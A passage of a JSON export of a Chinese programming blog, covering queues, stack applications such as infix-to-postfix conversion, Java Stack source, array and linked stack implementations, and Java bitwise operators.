top 和 rear 实际上是两个变量，它的值分别是队头元素和队尾元素所在数组位置的下标。 在上图的基础上，当有数据元素进队列时，对应的实现操作是将其存储在指针 rear 指向的数组位置，然后 rear+1；当需要队头元素出队时，仅需做 top+1 操作。 例如，在上图基础上将 {1,2,3,4} 用顺序队列存储的实现操作如下图所示： 在上图基础上，顺序队列中数据出队列的实现过程如下图所示： 通过对比在所有元素入队之前和所有元素出队之后的状态，你会发现，指针 top 和 rear 重合位置指向了 a[4] 而不再是 a[0]。也就是说，整个顺序队列在数据不断地进队出队过程中，在顺序表中的位置不断后移。 顺序队列整体后移造成的影响是： 顺序队列之前的数组存储空间将无法再被使用，造成了空间浪费； 如果顺序表申请的空间不足够大，则直接造成程序中数组 a 溢出，产生溢出错误； 顺序队列另一种实现方法 - 循环队列既然明白了上面这种方法的弊端，那么我们可以试着在它的基础上对其改良。 为了解决以上两个问题，可以使用巧妙的方法将顺序表打造成一个环状表，如下图所示： 链表队列的实现链式队列的实现思想同顺序队列类似，只需创建两个指针（命名为 top 和 rear）分别指向链表中队列的队头元素和队尾元素，如下图所示： 例如，在上图的基础上，我们依次将 {1,2,3} 依次入队，各个数据元素入队的过程如下图所示: Reference 数据结构概述 - http://data.biancheng.net/intro/","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】栈的应用","date":"2019-05-17T07:17:57.000Z","path":"2019/05/17/【Data-Structure】栈-栈的应用/","text":"栈的应用栈是一种很重要的数据结构，在计算机中有着很广泛的应用，如下一些操作都应用到了栈。 符号匹配，HTML和XML文件中的标签匹配 中缀表达式（Infix Expressions）转换为后缀表达式（Postfix Expressions） 实现函数的嵌套调用 表达式求值 网页浏览器中已访问页面的历史记录 符号匹配在编写程序的过程中，我们经常会遇到诸如圆括号“()”与花括号“{}”，这些符号都必须是左右匹配的，这就是我们所说的符合匹配类型，当然符合不仅需要个数相等，而且需要先左后右的依次出现，否则就不符合匹配规则，如“)(”，明显是错误的匹配，而“()”才是正确的匹配。有时候符合如括号还会嵌套出现，如“9-(5+(5+1))”，而嵌套的匹配原则是一个右括号与其前面最近的一个括号匹配。 事实上编译器帮我们检查语法错误时，也是执行一样的匹配原理，而这一系列操作都需要借助栈来完成，接下来我们使用栈来实现括号”()”是否匹配的检测。 以str=”((5-3)*8-2)”为例。 a. str是一个表达式字符串，从左到右依次对字符串str中的每个字符char进行语法检测，如果char是左括号，则入栈，如果char是右括号，则出栈(有一对匹配就可以去匹配一个左括号，因此可以出栈)，若此时出栈的字符char为左括号，则说明这一对括号匹配正常。如果此时栈为空或者出栈字符不为左括号，则表示缺少与char匹配的左括号，即目前不完整。 b. 重复执行a操作，直到str检测结束，如果此时栈为空，则全部括号匹配，如果栈中还有左括号，是说明缺少右括号。 中缀表达式（Infix Expressions）转换为后缀表达式（Postfix Expressions）中缀表达式（Infix Expressions）我们先来了解一下什么是中缀表达式（Infix Expressions），数学里面的公式都是中缀表达式，如以下的表达式： 11+3*(9-2)+9 定义：将运算符写在两个操作数中间的表达式称为中缀表达式。 在中缀表达式中，运算符拥有不同的优先级，同时也可以使用圆括号改变运算次序，由于这两点的存在，使用的中缀表达式的运算规则比较复杂，求值的过程不能从左往右依次计算，当然这也是相对计算机而言罢了，毕竟我们日常生活的计算使用的还是中缀表达式。 既然计算机感觉复杂，那么我们就需要把中缀表达式转化成计算机容易计算而且不复杂的表达式，这就是后缀表达式了。 前缀表达式和后缀表达式波兰数学家Jan Lukasiewicz提出了另一种数学表示法，它有两种表示形式： 把运算符写在操作数之前，称为波兰表达式(Polish Expression)或前缀表达式(Prefix Expression)，如+AB； 把运算符写在操作数之后，称为逆波兰表达式(Reverse Polish Expression)或后缀表达式(Suffix Expression)，如AB+； 后缀表达式（Postfix Expressions）后缀表达式（Postfix Expressions），也称为逆波兰表达式（Reverse Polish Expression）。 在后缀表达式中，运算符（Operator）放在两个操作数（Operand）的后面，所有的计算按运算符出现的顺序，严格从左向右进行（不用考虑运算符的优先级）。 如下我们将中缀表达式转为后缀表达式： 12345//1+3*(9-2)+9 转化前的中缀表达式//1 3 9 2 - * + 9 + 转化后的后缀表达式// 2 * (9 + 6 / 3 - 5) + 4 转化前的中缀表达式// 2 9 6 3 / + 5 - * 4 + 转化后的后缀表达式 中缀转后缀的转换过程需要用到一个栈和一个数组，这个栈用于协助转换，数组用于存放转化后的后缀表达式。 具体过程如下： 如果： 遇到操作数，就直接将其放入数组中； 遇到左括号，就直接进栈。 遇到右括号，则将栈元素（运算符）不断弹出，并将弹出的运算符依次存入数组中，若遇到左括号后弹出停止。注意，左括号只弹出栈但不存入数组。 遇到运算符 + ， - ， * 或 \\ ，则将其放入到栈中： 若该运算符优先级大于栈顶运算符， 则把它压入栈； 若该运算符优先级小于等于栈顶运算符，将栈顶运算符出栈，并将其放入数组中；再比较新的栈顶运算符， 直到该运算符大于栈顶运算符优先级为止，然后将该运算符压入栈； 读到了输入的末尾，则将栈中所有元素依次弹出存入到数组中。 到此中缀表达式转化为后缀表达式完成，数组存储的元素顺序就代表转化后的后缀表达式。 执行图示过程如下： 求值的简化方法比如，要将中缀表达式(a+b)c(d-e/f) 转成后缀表达式。 首先按照运算的先后顺序将表达式全部都添加上括号； 1(a+b)c(d-e/f)---&gt;&gt; (((a+b)c)((d-(e/f)))) 然后由于是后缀表达式，从里到外将所有运算符都拿到右括号的右边； 1(((ab)+c)((d(ef)/)-)) 最后再将所有括号都去掉。 1ab+c*def/-* 同理，如果是变为前缀表达式的话，就把运算符拿到括号左边。 中缀表达式（Infix Expressions）转换为后缀表达式（Postfix Expressions）的实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172/** * 中缀转后缀 * @param expstr 中缀表达式字符串 * @return */public static String toPostfix(String expstr)&#123; //创建栈,用于存储运算符 SeqStack&lt;String&gt; stack = new SeqStack&lt;&gt;(expstr.length()); String postfix=\"\";//存储后缀表达式的字符串 int i=0; while (i&lt;expstr.length()) &#123; char ch=expstr.charAt(i); switch (ch) &#123; case '+': case '-': //当栈不为空或者栈顶元素不是左括号时,直接出栈,因此此时只有可能是*/+-四种运算符(根据规则4),否则入栈 while (!stack.isEmpty() &amp;&amp; !stack.peek().equals(\"(\")) &#123; postfix += stack.pop(); &#125; //入栈 stack.push(ch+\"\"); i++; break; case '*': case '/': //遇到运算符*/ while (!stack.isEmpty() &amp;&amp; (stack.peek().equals(\"*\") || stack.peek().equals(\"/\"))) &#123; postfix += stack.pop(); &#125; stack.push(ch+\"\"); i++; break; case '(': //左括号直接入栈 stack.push(ch+\"\"); i++; break; case ')': //遇到右括号(规则3) String out = stack.pop(); while (out!=null &amp;&amp; !out.equals(\"(\")) &#123; postfix += out; out = stack.pop(); &#125; i++; break; default: //操作数直接入栈 while (ch&gt;='0' &amp;&amp; ch&lt;='9') &#123; postfix += ch; i++; if (i&lt;expstr.length()) ch=expstr.charAt(i); else ch='='; &#125; //分隔符 postfix += \" \"; break; &#125; &#125; //最后把所有运算符出栈(规则5) while (!stack.isEmpty()) postfix += stack.pop(); return postfix;&#125; 计算后缀表达式转成后缀后，我们来看看计算机如何利用后缀表达式进行结果运算，通过前面的分析可知，后缀表达式是没有括号的，而且计算过程是按照从左到右依次进行的，因此在后缀表达的求值过程中，当遇到运算符时，只需要取前两个操作数直接进行计算即可，而当遇到操作数时不能立即进行求值计算，此时必须先把操作数保存等待获取到运算符时再进行计算，如果存在多个操作数，其运算次序是后出现的操作数先进行运算，也就是后进先运算，因此后缀表达式的计算过程我们也需要借助栈来完成，该栈用于存放操作数，后缀表达式的计算过程及其图解如下： 借助栈的程序计算过程： 简单分析说明一下： 如果ch是数字，先将其转换为整数再入栈； 如果是运算符，将两个操作数出栈，计算结果再入栈； 重复1）和2）直到后缀表达式结束，最终栈内的元素即为计算的结果。 计算后缀表达式的值的实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public class CalculateExpression &#123; /** * 计算后缀表达式的值 * @param postfix 传入后缀表达式 * @return */ public static int calculatePostfixValue(String postfix) &#123; //栈用于存储操作数,协助运算 LinkedStack&lt;Integer&gt; stack = new LinkedStack&lt;&gt;(); int i=0, result=0; while (i&lt;postfix.length()) &#123; char ch=postfix.charAt(i); if (ch&gt;='0' &amp;&amp; ch&lt;='9') &#123; result=0; while (ch!=' ') &#123; //将整数字符转为整数值ch=90 result = result*10 + Integer.parseInt(ch+\"\"); i++; ch = postfix.charAt(i); &#125; i++; stack.push(result);//操作数入栈 &#125; else &#123; //ch 是运算符,出栈栈顶的前两个元素 int y= stack.pop(); int x= stack.pop(); switch (ch) &#123; //根据情况进行计算 case '+': result=x+y; break; case '-': result=x-y; break; case '*': result=x*y; break; case '/': result=x/y; break; //注意这里并没去判断除数是否为0的情况 &#125; //将运算结果入栈 stack.push(result); i++; &#125; &#125; //将最后的结果出栈并返回 return stack.pop(); &#125; //测试 public static void main(String args[]) &#123; String expstr=\"1+3*(9-2)+90\"; String postfix = toPostfix(expstr); System.out.println(\"中缀表达式-&gt;expstr= \"+expstr); System.out.println(\"后缀表达式-&gt;postfix= \"+postfix); System.out.println(\"计算结果-&gt;value= \"+calculatePostfixValue(postfix)); &#125;&#125; 实现函数的嵌套调用操作系统给每个线程分配了一块独立的内存空间，这块内存被组织成“栈”这种结构，用来存储函数调用时的临时变量。 每进入一个函数，就会将函数中是所有的临时变量存入一个栈帧，并将这个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。 示例： 123456789101112131415int main() &#123; int a = 1; int ret = 0; int res = 0; ret = add(3, 5); res = a + ret; printf(\"%d\", res); reuturn 0;&#125;int add(int x, int y) &#123; int sum = 0; sum = x + y; return sum;&#125; 在main() 函数中调用了 add() 函数，获取计算结果，并且与临时变量 a 相加，最后打印 res 的值。这个过程的中函数栈里的出栈、入栈操作，如下所示： 思考：为什么函数要用栈来保存临时变量呢？用其他数据结构不行吗？ 函数调用的局部状态之所以用栈来记录是因为这些状态数据的存活时间满足“后入先出”（LIFO）顺序，而栈的基本操作正好就是支持这种顺序的访问。 栈是程序设计中的一种经典数据结构，每个程序都拥有自己的程序栈。栈帧也叫过程活动记录，是编译器用来实现函数调用过程的一种数据结构。C语言中，每个栈帧对应着一个未运行完的函数。从逻辑上讲，栈帧就是一个函数执行的环境：函数调用框架、函数参数、函数的局部变量、函数执行完后返回到哪里等等。栈是从高地址向低地址延伸的。每个函数的每次调用，都有它自己独立的一个栈帧，这个栈帧中维持着所需要的各种信息。 寄存器ebp(base pointer)指向当前的栈帧的底部（高地址），可称为“帧指针”或“基址指针”；寄存器esp(stack pointer)指向当前的栈帧的顶部（低地址），可称为“ 栈指针”。 在C和C++语言中，临时变量分配在栈中，临时变量拥有函数级的生命周期，即“在当前函数中有效，在函数外无效”。这种现象就是函数调用过程中的参数压栈，堆栈平衡所带来的。堆栈平衡是指函数调完成后，要返还所有使用过的栈空间。 函数调用其实可以看做4个过程： 压栈: 函数参数压栈，返回地址压栈 跳转: 跳转到函数所在代码处执行 执行: 执行函数代码 返回: 平衡堆栈，找出之前的返回地址，跳转回之前的调用点之后，完成函数调用 表达式求值以 3 + 5 x 8 - 6 为这个表达式为例，编译器是如何利用栈来实现表达式求值的呢？ 编译器会使用两个栈来实现，一个栈用来保存操作数（称为操作数栈），另一个栈用来保存运算符（称为运算符栈）。 从左向右遍历表达式： 当遇到数字就直接压入操作数栈； 当遇到操作符，要看看当前操作数栈中是否有元素 如果没有元素，就将这个操作符直接压入运算符栈； 如果有元素，就要将当前操作符与运算符栈的栈顶元素进行比较： 如果比运算符栈顶元素的优先级高，就将当前运算符压入运算符栈； 如果比运算符栈顶元素的优先级低或者相同，先从运算符栈中取栈顶运算符，再从操作数栈的栈顶依次取 2 个操作数，然后进行计算。计算完成后，把计算的结果压入操作数栈。继续比较。 网页浏览器中已访问页面的历史记录使用两个栈，X 和 Y，把首次浏览的页面依次压入栈 X，当点击后退按钮时，再依次从栈 X 中出栈，并将出栈的数据依次放入栈 Y。当我们点击前进按钮时，我们依次从栈 Y 中取出数据，放入栈 X 中。当栈 X 中没有数据时，那就说明没有页面可以继续后退浏览了。当栈 Y 中没有数据，那就说明没有页面可以点击前进按钮浏览了。 比如你顺序查看了 a，b，c 三个页面，我们就依次把 a，b，c 压入栈，这个时候，两个栈的数据就是这个样子： 当你通过浏览器的后退按钮，从页面 c 后退到页面 a 之后，我们就依次把 c 和 b 从栈 X 中弹出，并且依次放入到栈 Y。这个时候，两个栈的数据就是这个样子： 这个时候你又想看页面 b，于是你又点击前进按钮回到 b 页面，我们就把 b 再从栈 Y 中出栈，放入栈 X 中。此时两个栈的数据是这个样子： 这个时候，你通过页面 b 又跳转到新的页面 d 了，页面 c 就无法再通过前进、后退按钮重复查看了，所以需要清空栈 Y。此时两个栈的数据这个样子： Reference java数据结构与算法之栈（Stack）设计与实现 - https://blog.csdn.net/javazejian/article/details/53362993 数据结构与算法 | 栈的实现及应用 - https://juejin.im/post/5c3be7d5e51d455230711a27#heading-17","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Java】集合类-Stack","date":"2019-05-16T13:56:56.000Z","path":"2019/05/16/【Java】集合类-Stack/","text":"Stack 类是Vector类的一个子类，它通过数组实现了一个标准的后进先出的栈。 构造函数Stack 的实现非常简单，仅有一个构造方法。 12public Stack() &#123;&#125; 方法除了由Vector定义的所有方法，自己也定义了一些方法： 序号 方法描述 1 boolean empty() 测试堆栈是否为空。 2 Object peek( ) 查看堆栈顶部的对象，但不从堆栈中移除它。 3 Object pop( ) 移除堆栈顶部的对象，并作为此函数的值返回该对象。 4 Object push(Object element) 把项压入堆栈顶部。 5 int search(Object element) 返回对象在堆栈中的位置，以 1 为基数。 public boolean empty()返回栈是否为空。 123public boolean empty() &#123; return size() == 0;&#125; public synchronized E peek()返回栈顶元素，不执行删除操作 1234567public synchronized E peek() &#123; int len = size(); if (len == 0) throw new EmptyStackException(); return elementAt(len - 1);&#125; public synchronized E pop()返回栈顶元素，并将其从栈中删除。 123456789public synchronized E pop() &#123; E obj; int len = size(); obj = peek(); removeElementAt(len - 1); return obj;&#125; pop() 方法会调用 removeElementAt(int index)。 12345678910111213141516public synchronized void removeElementAt(int index) &#123; modCount++; if (index &gt;= elementCount) &#123; throw new ArrayIndexOutOfBoundsException(index + \" &gt;= \" + elementCount); &#125; else if (index &lt; 0) &#123; throw new ArrayIndexOutOfBoundsException(index); &#125; int j = elementCount - index - 1; if (j &gt; 0) &#123; System.arraycopy(elementData, index + 1, elementData, index, j); &#125; elementCount--; elementData[elementCount] = null; /* to let gc do its work */&#125; public E push(E item)push函数：将元素存入栈顶。 1234public E push(E item) &#123; addElement(item); return item;&#125; push(E item)会调用addElement(E obj)。 1234567891011public synchronized void addElement(E obj) &#123; modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = obj;&#125;private void ensureCapacityHelper(int minCapacity) &#123; // overflow-conscious code if (minCapacity - elementData.length &gt; 0) grow(minCapacity);&#125; public synchronized int search(Object o)查找“元素o”在栈中的位置：由栈底向栈顶方向数 12345678public synchronized int search(Object o) &#123; int i = lastIndexOf(o); if (i &gt;= 0) &#123; return size() - i; &#125; return -1;&#125; 例子123456789101112131415161718192021222324252627282930313233import java.util.*; public class StackDemo &#123; static void showpush(Stack&lt;Integer&gt; st, int a) &#123; st.push(new Integer(a)); System.out.println(\"push(\" + a + \")\"); System.out.println(\"stack: \" + st); &#125; static void showpop(Stack&lt;Integer&gt; st) &#123; System.out.print(\"pop -&gt; \"); Integer a = (Integer) st.pop(); System.out.println(a); System.out.println(\"stack: \" + st); &#125; public static void main(String args[]) &#123; Stack&lt;Integer&gt; st = new Stack&lt;Integer&gt;(); System.out.println(\"stack: \" + st); showpush(st, 42); showpush(st, 66); showpush(st, 99); showpop(st); showpop(st); showpop(st); try &#123; showpop(st); &#125; catch (EmptyStackException e) &#123; System.out.println(\"empty stack\"); &#125; &#125;&#125; 运行结果1234567891011121314stack: [ ]push(42)stack: [42]push(66)stack: [42, 66]push(99)stack: [42, 66, 99]pop -&gt; 99stack: [42, 66]pop -&gt; 66stack: [42]pop -&gt; 42stack: [ ]pop -&gt; empty stack Reference Stack - https://wiki.jikexueyuan.com/project/java-enhancement/java-thirtyone.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Data Structure】栈（Stack）","date":"2019-05-16T13:42:16.000Z","path":"2019/05/16/【Data-Structure】栈-栈/","text":"栈（Stack）栈（Stack），是一种有序特殊的线性表，只允许在有序的线性数据集合的一端（称为堆栈顶端，top）进行加入（push）数据和移除（pop）数据的运算。因而按照后进先出（LIFO, Last In First Out）的原理运作。 栈的基本操作创建栈，判空，入栈，出栈，获取栈顶元素等，注意栈不支持对指定位置进行删除，插入。 其实非常好理解，我们将栈可以看成一个箱子： 往箱子里面放东西叫做入栈（push）； 往箱子里面取东西叫做出栈（pop）； 箱子的底部叫做栈底（bottom）； 箱子的顶部叫做栈顶（top）。 说到栈的特性，肯定会有一句经典的言语来概括：先进后出（LIFO, Last In First Out）。 Stack这种数据结构用途很广泛，在计算机的使用中，大量的运用了栈，比如编译器中的词法分析器、Java虚拟机、软件中的撤销操作（Undo）、浏览器中的回退操作，编译器中的函数调用实现等等。 栈接口抽象数据类型12345678910111213141516171819202122232425public interface Stack&lt;T&gt; &#123; /** * 栈是否为空 * @return */ boolean isEmpty(); /** * data元素入栈 * @param data */ void push(T data); /** * 返回栈顶元素,未出栈 * @return */ T peek(); /** * 出栈,返回栈顶元素,同时从栈中移除该元素 * @return */ T pop();&#125; 栈的实现栈可以有两种实现： 静态栈（数组实现）- 顺序栈（Sequence Stack） 动态栈（链表实现）- 链式栈（Linked Stack） 顺序栈（Sequence Stack）的设计顺序栈，顾名思义就是采用顺序表实现的的栈， 123456789101112131415161718192021222324252627282930public class SeqStack&lt;T&gt; implements Stack&lt;T&gt;,Serializable &#123; private static final long serialVersionUID = -5413303117698554397L; /** * 栈顶指针,-1代表空栈 */ private int top=-1; /** * 容量大小默认为10 */ private int capacity=10; /** * 存放元素的数组 */ private T[] array; private int size; public SeqStack(int capacity)&#123; array = (T[]) new Object[capacity]; &#125; public SeqStack()&#123; array= (T[]) new Object[this.capacity]; &#125; //.......省略其他代码&#125; peek()获取栈顶元素值的peek操作过程如下图（未删除只获取值）： 实现 12345678910/** * 获取栈顶元素的值,不删除 * @return */ @Override public T peek() &#123; if(isEmpty()) new EmptyStackException(); return array[top]; &#125; push()从栈添加元素的过程如下（更新栈顶top指向）： 实现 1234567891011121314/** * 添加元素,从栈顶(数组尾部)插入 * 容量不足时，需要扩容 * @param data */@Overridepublic void push(T data) &#123; //判断容量是否充足 if(array.length==size) ensureCapacity(size*2+1);//扩容 //从栈顶添加元素 array[++top]=data;&#125; pop()栈弹出栈顶元素的过程如下（删除并获取值）： 实现 1234567891011/** * 从栈顶(顺序表尾部)删除 * @return */ @Override public T pop() &#123; if(isEmpty()) new EmptyStackException(); size--; return array[top--]; &#125; 链式栈（Linked Stack）的设计了解完顺序栈，我们接着来看看链式栈，所谓的链式栈（Linked Stack），就是采用链式存储结构的栈，由于我们操作的是栈顶一端，因此这里采用单链表（不带头结点）作为基础，直接实现栈的添加，获取，删除等主要操作即可。其操作过程如下图： 从图可以看出，无论是插入还是删除直接操作的是链表头部也就是栈顶元素，因此我们只需要使用不带头结点的单链表即可。代码实现如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970public class LinkedStack&lt;T&gt; implements Stack&lt;T&gt; ,Serializable&#123; private static final long serialVersionUID = 1911829302658328353L; private Node&lt;T&gt; top; private int size; public LinkedStack()&#123; this.top=new Node&lt;&gt;(); &#125; public int size()&#123; return size; &#125; @Override public boolean isEmpty() &#123; return top==null || top.data==null; &#125; @Override public void push(T data) &#123; if (data==null)&#123; throw new StackException(\"data can\\'t be null\"); &#125; if(this.top==null)&#123;//调用pop()后top可能为null this.top=new Node&lt;&gt;(data); &#125;else if(this.top.data==null)&#123; this.top.data=data; &#125;else &#123; Node&lt;T&gt; p=new Node&lt;&gt;(data,this.top); top=p;//更新栈顶 &#125; size++; &#125; @Override public T peek() &#123; if(isEmpty())&#123; throw new EmptyStackException(\"Stack empty\"); &#125; return top.data; &#125; @Override public T pop() &#123; if(isEmpty())&#123; throw new EmptyStackException(\"Stack empty\"); &#125; T data=top.data; top=top.next; size--; return data; &#125; //测试 public static void main(String[] args)&#123; LinkedStack&lt;String&gt; sl=new LinkedStack&lt;&gt;(); sl.push(\"A\"); sl.push(\"B\"); sl.push(\"C\"); int length=sl.size(); for (int i = 0; i &lt; length; i++) &#123; System.out.println(\"sl.pop-&gt;\"+sl.pop()); &#125; &#125;&#125; 算法复杂度分析我们来看看顺序栈与链式栈中各个操作的算法复杂度（时间和空间）对比。 顺序栈复杂度如下： 操作 时间复杂度 SeqStack空间复杂度(用于N次push) O(n) push()时间复杂度 O(1)* pop()时间复杂度 O(1) peek()时间复杂度 O(1) isEmpty()时间复杂度 O(1) 注明：push操作在特定情况下会触发resize（此时时间复杂度为 O(N)），但平均时间复杂度是O(1)的。 链式栈复杂度如下： 操作 时间复杂度 SeqStack空间复杂度(用于N次push) O(1) push()时间复杂度 O(1) pop()时间复杂度 O(1) peek()时间复杂度 O(1) isEmpty()时间复杂度 O(1) Reference java数据结构与算法之栈（Stack）设计与实现 - https://blog.csdn.net/javazejian/article/details/53362993 数据结构与算法 | 栈的实现及应用 - https://juejin.im/post/5c3be7d5e51d455230711a27#heading-17","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Java】运算符-位运算符","date":"2019-05-16T08:07:17.000Z","path":"2019/05/16/【Java】运算符-位运算符/","text":"基础我们已经知道计算机中，所有数据最终都是使用二进制数表达。 比如，假设有一 int 类型的数，值为5，那么，我们知道它在计算机中表示为：00000000 00000000 00000000 00000101 5转换成二制是101，不过int类型的数占用4字节（32位），所以前面填了一堆0。 现在想知道，-5在计算机中如何表示？ 在计算机中，负数以其正值的补码形式表达。 什么叫补码呢？这得从原码，反码说起。 原码原码：一个整数，按照绝对值大小转换成的二进制数，称为原码。 比如 00000000 00000000 00000000 00000101 是 5 的原码。 反码反码：将二进制数按位取反，所得的新二进制数称为原二进制数的反码。 取反操作指：原为1，得0；原为0，得1（即，1变0，0变1）。 比如：将00000000 00000000 00000000 00000101每一位取反，得11111111 11111111 11111111 11111010。 称：11111111 11111111 11111111 11111010是 00000000 00000000 00000000 00000101 的反码。 反码是相互的，所以也可称： 11111111 11111111 11111111 11111010 和00000000 00000000 00000000 00000101 互为反码。 补码补码：反码加1称为补码。 也就是说，要得到一个数的补码，先得到反码，然后将反码加上1，所得数称为补码。 比如：00000000 00000000 00000000 00000101的反码是：11111111 11111111 11111111 11111010。 那么，补码为： 11111111 11111111 11111111 11111010 + 1 = 11111111 11111111 11111111 11111011， 所以，-5 在计算机中表达为：11111111 11111111 11111111 11111011。 位运算符Java提供的位运算符有：左移（&lt;&lt;）、右移（&gt;&gt;）、无符号右移（&gt;&gt;&gt;）、位与（&amp;）、位或（|）、位非（）、位异或（^），除了位非（）是一元操作符外，其它的都是二元操作符。 其中，左移（&lt;&lt;）、右移（&gt;&gt;）和无符号右移（&gt;&gt;&gt;）为移位运算符。 位运算符 - 位与（&amp;）12345public class Test &#123; public static void main(String[] args) &#123; System.out.println(5 &amp; 3);//结果为1 &#125;&#125; 将2个操作数和结果都转换为二进制进行比较：5转换为二进制：0000 0000 0000 0000 0000 0000 0000 0101 3转换为二进制：0000 0000 0000 0000 0000 0000 0000 0011 1转换为二进制：0000 0000 0000 0000 0000 0000 0000 0001 位与：第一个操作数的的第n位于第二个操作数的第n位如果都是1，那么结果的第n为也为1，否则为0。 位或（|）12345public class Test &#123; public static void main(String[] args) &#123; System.out.println(5 | 3);//结果为7 &#125;&#125; 5转换为二进制：0000 0000 0000 0000 0000 0000 0000 0101 3转换为二进制：0000 0000 0000 0000 0000 0000 0000 0011 7转换为二进制：0000 0000 0000 0000 0000 0000 0000 0111位或操作：第一个操作数的的第n位于第二个操作数的第n位 只要有一个是1，那么结果的第n为也为1，否则为0 位非（~）12345public class Test &#123; public static void main(String[] args) &#123; System.out.println(5 ^ 3);//结果为6 &#125;&#125; 5转换为二进制：0000 0000 0000 0000 0000 0000 0000 0101 3转换为二进制：0000 0000 0000 0000 0000 0000 0000 0011 6转换为二进制：0000 0000 0000 0000 0000 0000 0000 0110 位异或：第一个操作数的的第n位于第二个操作数的第n位 相反，那么结果的第n为也为1，否则为0。 位异或（^）12345public class Test &#123; public static void main(String[] args) &#123; System.out.println(~5);//结果为-6 &#125;&#125; 5转换为二进制：0000 0000 0000 0000 0000 0000 0000 0101 -6转换为二进制：1111 1111 1111 1111 1111 1111 1111 1010 位非：操作数的第n位为1，那么结果的第n位为0，反之。 移位运算符Java中有三种移位运算符： &lt;&lt; ：左移运算符，num &lt;&lt; 1（等价于 1 &gt;&gt; num），相当于num乘以2 &gt;&gt; ：右移运算符，num &gt;&gt; 1（等价于 1 &lt;&lt; num），相当于num除以2 &gt;&gt;&gt;：无符号右移运算符，忽略符号位，空位都以0补齐 移位运算符 - 左移运算符（&lt;&lt;）12345public class Test &#123; public static void main(String[] args) &#123; System.out.println(5&lt;&lt;2);//运行结果是20 &#125;&#125; 运行结果是20，但是程序是怎样执行的呢？ 首先会将5转为2进制表示形式(java中，整数默认就是int类型,也就是32位)： 120000 0000 0000 0000 0000 0000 0000 0101 然后左移2位后，低位补0：0000 0000 0000 0000 0000 0000 0001 0100 换算成10进制为20 移位运算符 - 右移运算符（&gt;&gt;）1System.out.println(5&gt;&gt;2);//运行结果是1 还是先将5转为2进制表示形式： 120000 0000 0000 0000 0000 0000 0000 0101 然后右移2位，高位补0：0000 0000 0000 0000 0000 0000 0000 0001 移位运算符 - 无符号右移运算符（&gt;&gt;&gt;）我们知道在Java中int类型占32位，可以表示一个正数，也可以表示一个负数。正数换算成二进制后的最高位为0，负数的二进制最高为为1。 例如 -5换算成二进制后为： 11111 1111 1111 1111 1111 1111 1111 1011 注意，负数在计算机中，用其对应正数的补码来表示。 因为补码的计算，是通过原始值的反码+1得到的，而进行反码时，表示符号位的第一位自然也被取反了，因此，负数的符号位一定和其对应正数的符号位互反。 我们分别对5进行右移3位、 -5进行右移3位和无符号右移3位： 1234567public class Test &#123; public static void main(String[] args) &#123; System.out.println(5&gt;&gt;3);//结果是0 System.out.println(-5&gt;&gt;3);//结果是-1 System.out.println(-5&gt;&gt;&gt;3);//结果是536870911 &#125;&#125; 我们来看看它的移位过程(可以通过其结果换算成二进制进行对比)： 5换算成二进制： 0000 0000 0000 0000 0000 0000 0000 0101 5右移3位后结果为0，0的二进制为： 0000 0000 0000 0000 0000 0000 0000 0000 // (用0进行补位) -5换算成二进制： 1111 1111 1111 1111 1111 1111 1111 1011 -5右移3位后结果为-1，-1的二进制为： 1111 1111 1111 1111 1111 1111 1111 1111 // (用1进行补位) -5无符号右移3位后的结果 536870911 换算成二进制： 0001 1111 1111 1111 1111 1111 1111 1111 // (用0进行补位) 通过其结果转换成二进制后，我们可以发现： 正数右移，高位用0补； 负数右移，高位用1补； 当负数使用无符号右移时，高位用0进行补位。 因此，自然而然地，使用无符号右移后，负数就会变成正数了)。 Demo12345678910111213141516171819202122public class Test &#123; public static void main(String[] args) &#123; int number = 10; //原始数二进制 printInfo(number); number = number &lt;&lt; 1; //左移一位 printInfo(number); number = number &gt;&gt; 1; //右移一位 printInfo(number); &#125; /** * 输出一个int的二进制数 * @param num */ private static void printInfo(int num)&#123; System.out.println(Integer.toBinaryString(num)); &#125;&#125; 运行结果运行结果为： 1231010101001010 我们把上面的结果对齐一下： 1234543210 位数-------- 1010 十进制：10 原始数 number10100 十进制：20 左移一位 number = number &lt;&lt; 1; 1010 十进制：10 右移一位 number = number &gt;&gt; 1; Reference java中的移位运算符：&lt;&lt;,&gt;&gt;,&gt;&gt;&gt;总结 - https://www.cnblogs.com/hongten/p/hongten_java_yiweiyunsuangfu.html Java 位运算(移位、位与、或、异或、非） - https://blog.csdn.net/xiaochunyong/article/details/7748713 负数的二进制表示 - https://www.jianshu.com/p/6c518e7b4690","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Data Structure】循环链表（Circular Linked List）","date":"2019-05-16T07:47:59.000Z","path":"2019/05/16/【Data-Structure】链表-循环链表/","text":"循环链表（Circular Linked List）双链表就是在单链表结点上增添了一个指针域，指向当前结点的前驱。这样就可以方便的由其后继来找到其前驱，而实现输出终端结点到开始结点的数据序列。 同样，双链表也分为带头结点的双链表和不带头结点的双链表，情况类似于单链表。带头结点的双链表 head-&gt;next 为null的时候链表为空。不带头结点的双链表head为null的时候链表为空。 循环链表实现约瑟夫环约瑟夫环问题，是一个经典的循环链表问题，题意是：已知 n 个人（分别用编号 1，2，3，…，n 表示）围坐在一张圆桌周围，从编号为 k 的人开始顺时针报数，数到 m 